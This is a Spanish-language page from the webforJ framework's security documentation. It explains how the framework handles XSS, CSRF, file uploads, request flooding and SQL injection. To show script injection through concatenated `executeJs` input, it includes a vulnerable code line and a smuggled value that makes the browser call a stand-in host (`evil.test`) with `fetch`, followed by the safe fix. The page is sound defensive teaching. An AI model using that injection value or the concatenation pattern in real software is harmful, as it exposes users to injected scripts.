---
sidebar_position: 2
title: Common Threats
description: >-
  How common web threats such as cross-site scripting (XSS), cross-site request
  forgery (CSRF), and SQL injection apply to a webforJ app, what the framework
  handles, and where you stay responsible.
_i18n_hash: f19a2bbb311243417c723fe49ad7d72f
---
Porque una aplicación webforJ se ejecuta en Java en el servidor y el navegador solo renderiza la interfaz (consulta el artículo sobre [Interacción Cliente/Servidor](/docs/architecture/client-server)), varias clases de ataque están contenidas por diseño. Otras dependen de cómo escribas tu código. Esta página analiza las amenazas más importantes y traza una línea clara entre lo que maneja webforJ y lo que te corresponde manejar a ti.

## Cross-site scripting (XSS) {#cross-site-scripting-xss}

Un ataque de cross-site scripting (XSS) tiene éxito cuando una cadena destinada a mostrarse como texto se interpreta como marcado activo en el navegador. webforJ cierra esto por defecto: cuando estableces el texto de un componente, el valor se muestra literalmente, por lo que las etiquetas internas aparecen como caracteres y nunca se ejecutan.

```java
// Se muestra como los caracteres literales "<b>hi</b>"
component.setText("<b>hi</b>");
```

Renderizar un marcado real es un paso separado y deliberado. webforJ trata un valor como marcado solo cuando está envuelto en `<html>...</html>`, que es exactamente lo que hace el método `setHtml` de la preocupación `HasHtml` para ti. Un valor establecido de otra manera se reduce primero a texto plano.

```java
// Renderizado como marcado, a propósito
component.setHtml("<b>hi</b>");
```

:::danger El marcado en el que optas no se limpia por ti
El marco no limpia el marcado que envuelves en `<html>`. En el momento en que cualquier fragmento de él provenga de una persona, un registro almacenado, una cadena de consulta o cualquier otra fuente que no controles completamente, límpialo tú mismo antes de que llegue a un componente. Busca un limpiador mantenido como [jsoup](https://jsoup.org/) o el [Sanitizador HTML de Java de OWASP](https://owasp.org/www-project-java-html-sanitizer/) y aliméntalo con una lista permitida de las etiquetas que realmente pretendes permitir.
:::

### Ejecutando JavaScript {#executing-javascript}

La misma regla se aplica a los scripts que ejecutas en el cliente con `executeJs` y sus variantes asíncronas (la API <JavadocLink type="foundation" location="com/webforj/concern/HasJsExecution" code='true'>HasJsExecution</JavadocLink>). `executeJs` ejecuta la cadena que le das como un programa, así que cualquier cosa que termine dentro de esa cadena es lo que el navegador ejecuta, incluyendo cualquier cosa que hayas insertado de un valor no confiable.

```java
// Peligroso: el valor se incorpora al texto del programa
el.executeJs("greet('" + name + "')");
```

Si `name` contiene `'); fetch('https://evil.test'); ('`, el navegador ejecuta el siguiente programa en su lugar:

```js
greet(''); fetch('https://evil.test'); ('')
```

El `fetch` del atacante ahora es una declaración en tu programa, por lo que se ejecuta. La concatenación es lo que hizo que la entrada *fuera parte del código*.

Mantén los valores no confiables fuera del script por completo. Envía el valor al cliente como datos, establecélo en el elemento, luego ejecuta un script fijo que lo lea de nuevo a través de la palabra clave `component`:

```java
// Seguro: el valor son datos que el script lee, nunca código
el.setProperty("greetName", name);
el.executeJs("greet(component.greetName)");
```

Aquí el programa que ejecuta el navegador es siempre solo `greet(component.greetName)`. No hay entrada no confiable en él para analizar. El valor se encuentra en una propiedad, y leer un valor de cadena nunca lo ejecuta, así que el mismo `name` se pasa a `greet` como texto en lugar de ejecutarse como código.

## Cross-site request forgery (CSRF) {#cross-site-request-forgery-csrf}

Un ataque de cross-site request forgery (CSRF) engaña al navegador de un usuario autenticado para que envíe una acción que el usuario nunca tuvo la intención de realizar. webforJ bloquea esto para su propio tráfico sin ninguna configuración: el marco solo confía en las solicitudes que pertenecen a la sesión del usuario actual, por lo que una página de otro origen no puede controlar la aplicación en nombre del usuario.

Esto se hace visible en exactamente una situación. [Spring Security](/docs/security/getting-started) activa su propia protección contra solicitudes falsificadas para cada solicitud, y no tiene conocimiento del canal de webforJ, por lo que rechazaría el tráfico del marco y la aplicación no se cargaría. La integración de Spring de webforJ resuelve esto por ti: <JavadocLink type="spring-integration" location="com/webforj/spring/security/WebforjSecurityConfigurer" suffix="#webforj()" code='true'>WebforjSecurityConfigurer.webforj()</JavadocLink> indica a Spring que omita su verificación para las solicitudes del marco de webforJ. Esto es seguro porque el marco ya protege esas solicitudes por sí solo, así que nada queda desprotegido.

:::info Configuración de Spring hecha a mano
Si ensamblas un `SecurityFilterChain` sin el ayudante `webforj()`, excluye las solicitudes del marco de la verificación de Spring tú mismo, y deja esa verificación activada para cualquier extremo que agregues.
:::

## Cargas de archivos sin límites {#unbounded-file-uploads}

Aceptar archivos de cualquier tamaño o cantidad invita a denegaciones de servicio a través de la memoria, el disco o el ancho de banda agotado. Limita lo que aceptas en los componentes de carga: exponen `setMaxFileSize()` para limitar cada archivo y `setMaxFiles()` para limitar cuántos llegan a la vez.

Considera eso como la primera línea en lugar de la única. Un límite del lado del navegador puede ser eludido, así que aplica un límite en el servidor también: establece `webforj.fileUpload.maxSize` en tu [configuración](/docs/configuration/properties) para rechazar las cargas sobredimensionadas antes de que lleguen a tu código, y limita el tamaño máximo de solicitud en tu contenedor de servlets o proxy inverso.

## Inundación de solicitudes {#request-flooding}

Un cliente manipulado también puede intentar abrumar el servidor directamente: enviando una sola solicitud muy grande, o comenzando nuevas sesiones de aplicación en rápida sucesión hasta que la memoria u otros recursos se agoten. Dado que el servidor controla cada aplicación, una inundación de cualquiera de los tipos llega directamente a él.

webforJ puede limitar ambos. Establece `webforj.security.maxContentLength` para limitar, en bytes, el tamaño de una solicitud que la aplicación acepta, y `webforj.security.maxInitPerMinute` para limitar cuántas nuevas sesiones de aplicación comienzan por minuto. Ambos predeterminan a `0`, lo que los deja desactivados, así que configúralos para cualquier implementación abierta a tráfico no confiable. Consulta [Configuración de Propiedades](/docs/configuration/properties) para más detalles.

Al igual que con las cargas, considera estos como la capa interna y limita el tamaño de la solicitud en tu contenedor de servlets o proxy inverso también.

## Inyección de SQL {#sql-injection}

webforJ no se encuentra en ninguna parte cerca de tu capa de datos, por lo que la resistencia a la inyección de SQL recae completamente en tu código de consulta. Utiliza consultas parametrizadas o declaraciones preparadas para que los valores se vinculen como parámetros en lugar de concatenarse en la declaración, y nunca construyas una consulta uniendo cadenas con entrada del usuario. Esta es la práctica ordinaria de JDBC y de la capa de persistencia, y se aplica sin cambios en una aplicación webforJ.
